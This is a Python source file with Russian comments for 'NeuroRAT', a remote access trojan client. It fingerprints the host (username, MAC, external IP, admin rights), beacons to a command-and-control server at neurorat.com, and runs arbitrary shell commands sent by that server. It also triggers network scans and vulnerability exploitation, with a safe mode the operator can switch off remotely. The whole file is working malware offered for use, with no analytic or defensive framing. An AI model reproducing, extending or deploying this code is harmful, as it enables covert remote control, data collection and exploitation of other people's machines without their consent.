#!/usr/bin/env python3
"""
NeuroRAT - Основной модуль для управления скрытыми каналами связи
Запускает и координирует работу всех компонентов системы
"""

import os
import sys
import time
import json
import base64
import argparse
import logging
import signal
import platform
import threading
from typing import Dict, List, Any, Optional

# Добавляем текущую директорию в путь для импорта модулей
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Импортируем наши модули
from channel_manager import ChannelManager
from modules.crypto import EncryptionManager, CryptoUtils
from c1_exploit_integration import C1ExploitIntegration

# Настройка логирования
def setup_logging(log_level: str = "INFO", log_file: str = None) -> None:
    """
    Настраивает систему логирования
    
    Args:
        log_level: Уровень логирования
        log_file: Файл для записи логов
    """
    # Преобразуем текстовый уровень логирования в константу
    level = getattr(logging, log_level.upper(), logging.INFO)
    
    # Настройка форматирования
    log_format = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    
    # Настраиваем обработчики логов
    handlers = [logging.StreamHandler()]
    
    if log_file:
        try:
            handlers.append(logging.FileHandler(log_file))
        except Exception as e:
            print(f"Ошибка при создании файла логов: {e}")
    
    # Применяем настройки
    logging.basicConfig(
        level=level,
        format=log_format,
        handlers=handlers
    )


class NeuroRATClient:
    """
    Основной класс клиента NeuroRAT
    Управляет всеми компонентами системы
    """
    
    def __init__(
        self,
        config_file: str = None,
        c2_host: str = "neurorat.com",
        c2_ip: str = None,
        encryption_method: str = "aes",
        encryption_key: str = None,
        primary_channel: str = "https"
    ):
        """
        Инициализация клиента
        
        Args:
            config_file: Путь к файлу конфигурации
            c2_host: Хост C2-сервера
            c2_ip: IP-адрес C2-сервера (для ICMP)
            encryption_method: Метод шифрования
            encryption_key: Ключ шифрования (если None, генерируется автоматически)
            primary_channel: Основной канал связи
        """
        self.logger = logging.getLogger("neuroclient")
        
        # Загружаем конфигурацию
        self.config = self._load_config(config_file) if config_file else {}
        
        # Применяем параметры из конфигурации или используем значения по умолчанию
        self.c2_host = c2_host or self.config.get("c2_host", "neurorat.com")
        self.c2_ip = c2_ip or self.config.get("c2_ip")
        self.encryption_method = encryption_method or self.config.get("encryption_method", "aes")
        self.encryption_key = self._load_encryption_key(encryption_key)
        self.primary_channel = primary_channel or self.config.get("primary_channel", "https")
        
        # Параметры каналов из конфигурации
        self.channels_config = self.config.get("channels", {})
        
        # Компоненты системы
        self.channel_manager = None
        # Интеграция модуля автоматизации эксплойтов
        self.exploit_integration = C1ExploitIntegration(safe_mode=True)
        
        # Статус работы
        self.is_running = False
        self.main_thread = None
        
        # Информация о системе
        self.system_info = self._collect_system_info()
        
        # Очередь команд для выполнения
        self.command_queue = []
        self.command_queue_lock = threading.RLock()
        
        # Обработчик сигналов завершения
        signal.signal(signal.SIGINT, self._signal_handler)
        if platform.system() != "Windows":
            signal.signal(signal.SIGTERM, self._signal_handler)
        
        self.logger.info("NeuroRAT клиент инициализирован")
    
    def _load_config(self, config_file: str) -> Dict[str, Any]:
        """
        Загружает конфигурацию из файла
        
        Args:
            config_file: Путь к JSON-файлу с конфигурацией
            
        Returns:
            Dict: Загруженная конфигурация
        """
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                self.logger.info(f"Конфигурация загружена из {config_file}")
                return config
        except Exception as e:
            self.logger.error(f"Ошибка загрузки конфигурации: {e}")
            return {}
    
    def _load_encryption_key(self, key_str: str = None) -> bytes:
        """
        Загружает или генерирует ключ шифрования
        
        Args:
            key_str: Строка ключа в base64 (если None, генерируется новый ключ)
            
        Returns:
            bytes: Ключ шифрования
        """
        if key_str:
            try:
                return base64.b64decode(key_str)
            except:
                self.logger.error("Некорректный формат ключа шифрования")
        
        # Пытаемся получить ключ из конфигурации
        config_key = self.config.get("encryption_key")
        if config_key:
            try:
                return base64.b64decode(config_key)
            except:
                self.logger.error("Некорректный формат ключа в конфигурации")
        
        # Генерируем новый ключ
        key = os.urandom(32)  # 256-bit key
        self.logger.info("Сгенерирован новый ключ шифрования")
        return key
    
    def _collect_system_info(self) -> Dict[str, Any]:
        """
        Собирает информацию о системе
        
        Returns:
            Dict: Информация о системе
        """
        import socket
        import getpass
        import uuid
        
        system_info = {
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "username": getpass.getuser(),
            "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                   for elements in range(0, 8*6, 8)][::-1]),
            "ip_addresses": {}
        }
        
        # Получаем IP-адреса
        try:
            hostname = socket.gethostname()
            system_info["ip_addresses"]["local"] = socket.gethostbyname(hostname)
            
            # Пытаемся получить внешний IP
            try:
                import urllib.request
                external_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
                system_info["ip_addresses"]["external"] = external_ip
            except:
                pass
            
        except Exception as e:
            self.logger.error(f"Ошибка при получении IP-адресов: {e}")
        
        # Проверяем права администратора
        if platform.system() == "Windows":
            import ctypes
            system_info["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            system_info["is_admin"] = os.geteuid() == 0
        
        return system_info
    
    def _signal_handler(self, sig, frame) -> None:
        """Обработчик сигналов для корректного завершения"""
        self.logger.info(f"Получен сигнал завершения {sig}")
        self.stop()
    
    def _data_callback(self, data: bytes) -> None:
        """
        Обработчик данных, полученных от канала связи
        
        Args:
            data: Полученные данные
        """
        try:
            # Пытаемся декодировать JSON-команду
            command_data = json.loads(data.decode('utf-8'))
            
            # Добавляем в очередь команд
            with self.command_queue_lock:
                self.command_queue.append(command_data)
                self.logger.info(f"Получена команда: {command_data.get('command', 'UNKNOWN')}")
        
        except json.JSONDecodeError:
            self.logger.warning("Получены некорректные данные (не JSON)")
        except Exception as e:
            self.logger.error(f"Ошибка обработки данных: {e}")
    
    def _process_commands(self) -> None:
        """Обрабатывает команды из очереди"""
        with self.command_queue_lock:
            if not self.command_queue:
                return
            
            # Извлекаем команду из очереди
            command_data = self.command_queue.pop(0)
            
            # Обрабатываем команду
            command = command_data.get("command")
            parameters = command_data.get("parameters", {})
            command_id = command_data.get("id", "unknown")
            
            self.logger.info(f"Обработка команды {command} (ID: {command_id})")
            
            # Выполняем команду
            if command == "system_info":
                # Отправляем информацию о системе
                self._send_command_result(command_id, {"status": "success", "system_info": self.system_info})
            
            elif command == "execute_shell":
                # Выполняем shell-команду
                result = self._execute_shell_command(parameters.get("shell_command"), 
                                                  parameters.get("timeout", 60))
                self._send_command_result(command_id, result)
            
            elif command == "update_config":
                # Обновляем конфигурацию
                self._update_config(parameters)
                self._send_command_result(command_id, {"status": "success", "message": "Конфигурация обновлена"})
            
            elif command == "restart":
                # Перезапускаем клиент
                self._send_command_result(command_id, {"status": "success", "message": "Перезапуск клиента..."})
                self.restart()
            
            elif command == "shutdown":
                # Останавливаем клиент
                self._send_command_result(command_id, {"status": "success", "message": "Завершение работы..."})
                self.stop()
            
            elif command == "scan_network":
                result = self.exploit_integration.scan_network(
                    target_range=parameters.get("target_range"),
                    concurrency=parameters.get("concurrency", 5)
                )
                self._send_command_result(command_id, result)
            
            elif command == "exploit_vulnerabilities":
                result = self.exploit_integration.exploit_vulnerabilities(
                    target_hosts=parameters.get("target_hosts")
                )
                self._send_command_result(command_id, result)
            
            elif command == "generate_report":
                result = self.exploit_integration.generate_report(
                    include_details=parameters.get("include_details", True)
                )
                self._send_command_result(command_id, result)
            
            elif command == "set_safe_mode":
                result = self.exploit_integration.set_safe_mode(
                    safe_mode=parameters.get("safe_mode", True)
                )
                self._send_command_result(command_id, result)
            
            elif command == "get_vulnerability_details":
                result = self.exploit_integration.get_vulnerability_details(
                    vuln_id=parameters.get("vuln_id")
                )
                self._send_command_result(command_id, result)
            
            elif command == "get_exploit_details":
                result = self.exploit_integration.get_exploit_details(
                    exploit_id=parameters.get("exploit_id")
                )
                self._send_command_result(command_id, result)
            
            else:
                # Неизвестная команда
                self._send_command_result(command_id, {
                    "status": "error",
                    "message": f"Неизвестная команда: {command}"
                })
    
    def _execute_shell_command(self, command: str, timeout: int = 60) -> Dict[str, Any]:
        """
        Выполняет shell-команду
        
        Args:
            command: Команда для выполнения
            timeout: Таймаут в секундах
            
        Returns:
            Dict: Результат выполнения команды
        """
        import subprocess
        
        if not command:
            return {"status": "error", "message": "Не указана команда"}
        
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            stdout, stderr = process.communicate(timeout=timeout)
            
            return {
                "status": "success" if process.returncode == 0 else "error",
                "stdout": stdout,
                "stderr": stderr,
                "exit_code": process.returncode
            }
        
        except subprocess.TimeoutExpired:
            process.kill()
            return {
                "status": "error",
                "message": f"Превышено время выполнения команды ({timeout}с)"
            }
        except Exception as e:
            return {
                "status": "error",
                "message": str(e)
            }
    
    def _update_config(self, new_config: Dict[str, Any]) -> None:
        """
        Обновляет конфигурацию клиента
        
        Args:
            new_config: Новые параметры конфигурации
        """
        # Обновляем основные параметры
        if "c2_host" in new_config:
            self.c2_host = new_config["c2_host"]
        
        if "c2_ip" in new_config:
            self.c2_ip = new_config["c2_ip"]
        
        if "primary_channel" in new_config:
            self.primary_channel = new_config["primary_channel"]
        
        if "encryption_method" in new_config:
            self.encryption_method = new_config["encryption_method"]
        
        if "encryption_key" in new_config:
            try:
                self.encryption_key = base64.b64decode(new_config["encryption_key"])
            except:
                self.logger.error("Некорректный формат ключа шифрования в новой конфигурации")
        
        # Обновляем конфигурацию каналов
        if "channels" in new_config:
            self.channels_config.update(new_config["channels"])
        
        # Обновляем полную конфигурацию
        self.config.update(new_config)
        
        self.logger.info("Конфигурация обновлена")
    
    def _send_command_result(self, command_id: str, result: Dict[str, Any]) -> None:
        """
        Отправляет результат выполнения команды
        
        Args:
            command_id: Идентификатор команды
            result: Результат выполнения
        """
        response = {
            "type": "command_result",
            "id": command_id,
            "timestamp": time.time(),
            "result": result
        }
        
        try:
            # Сериализуем в JSON и отправляем
            json_data = json.dumps(response).encode('utf-8')
            
            if self.channel_manager:
                self.channel_manager.send(json_data)
                self.logger.info(f"Отправлен результат команды {command_id}")
            else:
                self.logger.error("Channel Manager не инициализирован")
        
        except Exception as e:
            self.logger.error(f"Ошибка отправки результата команды: {e}")
    
    def _main_loop(self) -> None:
        """Основной цикл работы клиента"""
        try:
            # Время последней отправки пинга
            last_ping_time = 0
            
            while self.is_running:
                current_time = time.time()
                
                # Обрабатываем команды из очереди
                self._process_commands()
                
                # Отправляем пинг каждые 5 минут
                if current_time - last_ping_time >= 300:  # 5 минут
                    self._send_ping()
                    last_ping_time = current_time
                
                # Спим некоторое время
                time.sleep(1)
        
        except Exception as e:
            self.logger.error(f"Ошибка в основном цикле: {e}")
            self.stop()
    
    def _send_ping(self) -> None:
        """Отправляет пинг на C2-сервер"""
        ping_data = {
            "type": "ping",
            "timestamp": time.time(),
            "system_info": self.system_info
        }
        
        try:
            # Сериализуем в JSON и отправляем
            json_data = json.dumps(ping_data).encode('utf-8')
            
            if self.channel_manager:
                self.channel_manager.send(json_data)
                self.logger.debug("Отправлен пинг")
            else:
                self.logger.error("Channel Manager не инициализирован")
        
        except Exception as e:
            self.logger.error(f"Ошибка отправки пинга: {e}")
    
    def restart(self) -> None:
        """Перезапускает клиент"""
        self.logger.info("Перезапуск клиента")
        self.stop()
        time.sleep(1)
        self.start()
    
    def start(self) -> bool:
        """
        Запускает клиент
        
        Returns:
            bool: True если запуск успешен
        """
        if self.is_running:
            return False
        
        try:
            # Инициализируем менеджер каналов
            self.channel_manager = ChannelManager(
                c2_host=self.c2_host,
                c2_ip=self.c2_ip,
                channels_config=self.channels_config,
                primary_channel=self.primary_channel,
                data_callback=self._data_callback,
                encryption_method=self.encryption_method
            )
            
            # Устанавливаем ключ шифрования
            if self.encryption_key:
                self.channel_manager.encryption_manager.set_key(
                    self.encryption_method, 
                    self.encryption_key
                )
            
            # Запускаем менеджер каналов
            if not self.channel_manager.start():
                self.logger.error("Не удалось запустить менеджер каналов")
                return False
            
            # Запускаем основной цикл
            self.is_running = True
            self.main_thread = threading.Thread(
                target=self._main_loop,
                daemon=True,
                name="NeuroRAT-Main"
            )
            self.main_thread.start()
            
            # Отправляем начальный пинг с информацией о системе
            self._send_ping()
            
            self.logger.info("NeuroRAT клиент запущен")
            return True
        
        except Exception as e:
            self.logger.error(f"Ошибка запуска клиента: {e}")
            return False
    
    def stop(self) -> None:
        """Останавливает клиент"""
        if not self.is_running:
            return
        
        self.is_running = False
        
        # Останавливаем менеджер каналов
        if self.channel_manager:
            try:
                self.channel_manager.stop()
            except Exception as e:
                self.logger.error(f"Ошибка остановки менеджера каналов: {e}")
        
        self.logger.info("NeuroRAT клиент остановлен")


def main():
    """Основная функция для запуска клиента"""
    # Разбор аргументов командной строки
    parser = argparse.ArgumentParser(description="NeuroRAT Client")
    parser.add_argument("-c", "--config", help="Путь к конфигурационному файлу")
    parser.add_argument("--log-level", default="INFO", help="Уровень логирования")
    parser.add_argument("--log-file", help="Файл для записи логов")
    parser.add_argument("--c2-host", help="Хост C2-сервера")
    parser.add_argument("--c2-ip", help="IP-адрес C2-сервера (для ICMP)")
    parser.add_argument("--primary-channel", help="Основной канал связи")
    parser.add_argument("--encryption-method", help="Метод шифрования")
    parser.add_argument("--encryption-key", help="Ключ шифрования (base64)")
    args = parser.parse_args()
    
    # Настройка логирования
    setup_logging(args.log_level, args.log_file)
    
    # Создаем и запускаем клиент
    client = NeuroRATClient(
        config_file=args.config,
        c2_host=args.c2_host,
        c2_ip=args.c2_ip,
        primary_channel=args.primary_channel,
        encryption_method=args.encryption_method,
        encryption_key=args.encryption_key
    )
    
    if client.start():
        # В реальном коде здесь может быть логика для запуска в качестве сервиса
        # или для выполнения в фоновом режиме
        try:
            # Простой способ - ждем завершения основного потока
            while client.is_running and client.main_thread.is_alive():
                time.sleep(1)
        except KeyboardInterrupt:
            # Обработка Ctrl+C
            client.stop()
    
    return 0


if __name__ == "__main__":
    sys.exit(main()) 